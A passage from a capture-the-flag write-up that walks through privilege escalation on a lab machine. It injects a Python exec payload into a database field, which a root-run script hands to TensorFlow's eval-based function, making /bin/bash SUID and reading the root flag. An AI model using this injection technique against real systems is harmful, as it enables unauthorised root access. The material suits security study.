<span class="mtk1">conn</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.connect(</span><span class="mtk9 mtki">host</span><span class="mtk5">=</span><span class="mtk4">'localhost'</span><span class="mtk1">,</span><span class="mtk9 mtki">database</span><span class="mtk5">=</span><span class="mtk4">'app'</span><span class="mtk1">,</span><span class="mtk9 mtki">user</span><span class="mtk5">=</span><span class="mtk4">'diego'</span><span class="mtk1">,</span><span class="mtk9 mtki">password</span><span class="mtk5">=</span><span class="mtk4">'dCb#1!x0</span><span class="mtk6">%g</span><span class="mtk4">jq'</span><span class="mtk1">)</span>
<span class="mtk1">cursor</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">conn</span><span class="mtk1">.cursor()</span>
<span class="mtk1">cursor</span><span class="mtk1">.execute(</span><span class="mtk4">'select reason from escalate'</span><span class="mtk1">)</span>
<span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk1">i</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">cursor</span><span class="mtk1">.fetchall()]</span>
<span class="mtk1">conn</span><span class="mtk1">.close()</span>
<span class="mtk1">data</span><span class="mtk5">=</span><span class="mtk1">[]</span>
<span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">r</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">)</span>
<span class="mtk1">Xnew</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getVec</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">)</span>

<span class="mtk3">#1 DecisionTreeClassifier</span>
<span class="mtk1">ynew1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">loaded_model1</span><span class="mtk1">.predict(</span><span class="mtk1">Xnew</span><span class="mtk1">)</span>
<span class="mtk3">#2 SVC</span>
<span class="mtk1">ynew2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">loaded_model2</span><span class="mtk1">.predict(</span><span class="mtk1">Xnew</span><span class="mtk1">)</span>
<span class="mtk3">#3 GaussianNB</span>
<span class="mtk1">ynew3</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">loaded_model3</span><span class="mtk1">.predict(</span><span class="mtk1">Xnew</span><span class="mtk1">)</span>
<span class="mtk3">#4 KNeighborsClassifier</span>
<span class="mtk1">ynew4</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">loaded_model4</span><span class="mtk1">.predict(</span><span class="mtk1">Xnew</span><span class="mtk1">)</span>
<span class="mtk3">#5 RandomForestClassifier</span>
<span class="mtk1">ynew5</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">loaded_model5</span><span class="mtk1">.predict(</span><span class="mtk1">Xnew</span><span class="mtk1">)</span>
<span class="mtk3">#6 MLPClassifier</span>
<span class="mtk1">ynew6</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">loaded_model6</span><span class="mtk1">.predict(</span><span class="mtk1">Xnew</span><span class="mtk1">)</span>

<span class="mtk3"># show the sample inputs and predicted outputs</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">assessData</span><span class="mtk1">(</span><span class="mtk9 mtki">i</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">score</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk6">.175</span><span class="mtk5">*</span><span class="mtk1">ynew1</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.15</span><span class="mtk5">*</span><span class="mtk1">ynew2</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.05</span><span class="mtk5">*</span><span class="mtk1">ynew3</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.075</span><span class="mtk5">*</span><span class="mtk1">ynew4</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.25</span><span class="mtk5">*</span><span class="mtk1">ynew5</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.3</span><span class="mtk5">*</span><span class="mtk1">ynew6</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">]))</span>  
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">score</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">.5</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">                preprocess_input_exprs_arg_string(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">],</span><span class="mtk9 mtki">safe</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">except</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">pass</span>

<span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">Xnew</span><span class="mtk1">)):</span>
<span class="mtk1">     </span><span class="mtk1">t</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">threading</span><span class="mtk1">.</span><span class="mtk8 mtku">Thread</span><span class="mtk1">(</span><span class="mtk9 mtki">target</span><span class="mtk5">=</span><span class="mtk8">assessData</span><span class="mtk1">, </span><span class="mtk9 mtki">args</span><span class="mtk5">=</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">,))</span>
<span class="mtk3">#     t.daemon = True</span>
<span class="mtk1">     </span><span class="mtk1">t</span><span class="mtk1">.</span><span class="mtk8">start</span><span class="mtk1">()</span>
</code></pre></div><p>It is a Machine Learning script that performs some operations on saved models. We can check if we have permissions to modify the script or the saved models:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ ls -l /opt/security/ml_security.py
-rwxr-xr-x 1 root root 5644 Nov 14 15:32 <span class="code-green">/opt/security/ml_security.py</span>
<span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ ls -la /opt/security/lib/
total 31392
drwxr-xr-x 2 root root     4096 Jul 22  2022 <span class="code-blue">.</span>
drwxr-xr-x 3 root root     4096 Nov 14 15:32 <span class="code-blue">..</span>
-rw-r--r-- 1 root root    51534 Jul  9  2022 d2v.model
-rw-r--r-- 1 root root    89314 Jul  9  2022 DecisionTreeClassifier.sav  
-rw-r--r-- 1 root root     1482 Jul  9  2022 GaussianNB.sav
-rw-r--r-- 1 root root 19375012 Jul  9  2022 KNeighborsClassifier.sav
-rw-r--r-- 1 root root    79195 Jul  9  2022 MLPClassifier.sav
-rw-r--r-- 1 root root 11783960 Jul  9  2022 RandomForestClassifier.sav
-rw-r--r-- 1 root root   741729 Jul  9  2022 SVC.sav
</code></pre></div><p>Everything is correct, so we can&rsquo;t get easy code execution by modifying the script or serializing some malicious payload with <code>pickle</code>. There are no Library Hijacking options either since <code>sudo</code> resets tne environment variables.</p><h3 id="code-injection">Code injection</h3><p>The script is related to Machine Learning, but there is a suspicious function being used:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># show the sample inputs and predicted outputs</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">assessData</span><span class="mtk1">(</span><span class="mtk9 mtki">i</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">score</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk6">.175</span><span class="mtk5">*</span><span class="mtk1">ynew1</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.15</span><span class="mtk5">*</span><span class="mtk1">ynew2</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.05</span><span class="mtk5">*</span><span class="mtk1">ynew3</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.075</span><span class="mtk5">*</span><span class="mtk1">ynew4</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.25</span><span class="mtk5">*</span><span class="mtk1">ynew5</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">])</span><span class="mtk5">+</span><span class="mtk1">(</span><span class="mtk6">.3</span><span class="mtk5">*</span><span class="mtk1">ynew6</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">]))</span>  
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">score</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">.5</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">                preprocess_input_exprs_arg_string(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk9 mtki">i</span><span class="mtk1">],</span><span class="mtk9 mtki">safe</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">except</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">pass</span>
</code></pre></div><p>Yes, <code>preprocess_input_exprs_arg_string</code>. This function comes from <code>tensorflow</code>, and doesn&rsquo;t look to be related with Machine Learning. In fact, if we search a bit, we will find that this function is vulnerable to code injection. More information at <a target="_blank" href="https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408">security.snyk.io</a>.</p><p>Indeed, the version of <code>tensorflow</code> is vulnerable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ pip freeze | grep tensorflow  
<span class="code-red">tensorflow</span>==2.6.3
<span class="code-red">tensorflow</span>-estimator==2.6.0
</code></pre></div><p>The injection occurs in that function because it uses <code>eval</code>. Therefore, we can run arbitrary Python code as <code>root</code> (because we are using <code>sudo</code>).</p><p>The variable called <code>data</code> comes fron the database:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># Grab links</span>
<span class="mtk1">conn</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.connect(</span><span class="mtk9 mtki">host</span><span class="mtk5">=</span><span class="mtk4">'localhost'</span><span class="mtk1">,</span><span class="mtk9 mtki">database</span><span class="mtk5">=</span><span class="mtk4">'app'</span><span class="mtk1">,</span><span class="mtk9 mtki">user</span><span class="mtk5">=</span><span class="mtk4">'diego'</span><span class="mtk1">,</span><span class="mtk9 mtki">password</span><span class="mtk5">=</span><span class="mtk4">'dCb#1!x0</span><span class="mtk6">%g</span><span class="mtk4">jq'</span><span class="mtk1">)</span>  
<span class="mtk1">cursor</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">conn</span><span class="mtk1">.cursor()</span>
<span class="mtk1">cursor</span><span class="mtk1">.execute(</span><span class="mtk4">'select reason from escalate'</span><span class="mtk1">)</span>
<span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk1">i</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">cursor</span><span class="mtk1">.fetchall()]</span>
<span class="mtk1">conn</span><span class="mtk1">.close()</span>
<span class="mtk1">data</span><span class="mtk5">=</span><span class="mtk1">[]</span>
<span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">r</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><p>And we have the credentials there (also, they are reused from SSH). Hence, let&rsquo;s add malicious Python code in the database and run the script. For instance, let&rsquo;s set <code>/bin/bash</code> to be a SUID binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ mysql --user=diego --password='dCb#1!x0%gjq' --database=app
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 451
Server version: 8.0.31-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show tables;
+---------------+
| Tables_in_app |
+---------------+
| admin_tickets |
| escalate      |
| forgot        |
| tickets       |
| users         |
+---------------+
5 rows in set (0.01 sec)

mysql&gt; describe escalate;
+--------+------+------+-----+---------+-------+
| Field  | Type | Null | Key | Default | Extra |
+--------+------+------+-----+---------+-------+
| user   | text | YES  |     | NULL    |       |
| issue  | text | YES  |     | NULL    |       |
| link   | text | YES  |     | NULL    |       |
| reason | text | YES  |     | NULL    |       |
+--------+------+------+-----+---------+-------+
4 rows in set (0.01 sec)

mysql&gt; insert into escalate (reason) values ('x = exec("""__import__("os").system("chmod 4755 /bin/bash")""")');  
Query OK, 1 row affected (0.00 sec)

mysql&gt; select * from escalate;
+------+-------+------+-----------------------------------------------------------------+
| user | issue | link | reason                                                          |
+------+-------+------+-----------------------------------------------------------------+
| NULL | NULL  | NULL | x = exec("""__import__("os").system("chmod 4755 /bin/bash")""") |
+------+-------+------+-----------------------------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; exit
Bye
</code></pre></div><p>Now we will run the script with <code>sudo</code> and successfully change <code>/bin/bash</code> permissions:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-green">/bin/bash</span>
<span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ sudo /opt/security/ml_security.py
yyyy-mm-dd HH:MM:SS.ms: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory  
yyyy-mm-dd HH:MM:SS.ms: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
<span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-white code-bg-red">/bin/bash</span>
</code></pre></div><p>At this point, we can get access as <code>root</code> and read the <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ bash -p
bash-5.0# cat /root/root.txt
7be898da875128a659f527248b8648c8  
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#password-reset-poisoning">Password reset poisoning</a></li><li><a href="#web-cache-poisoning">Web cache poisoning</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#code-injection">Code injection</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>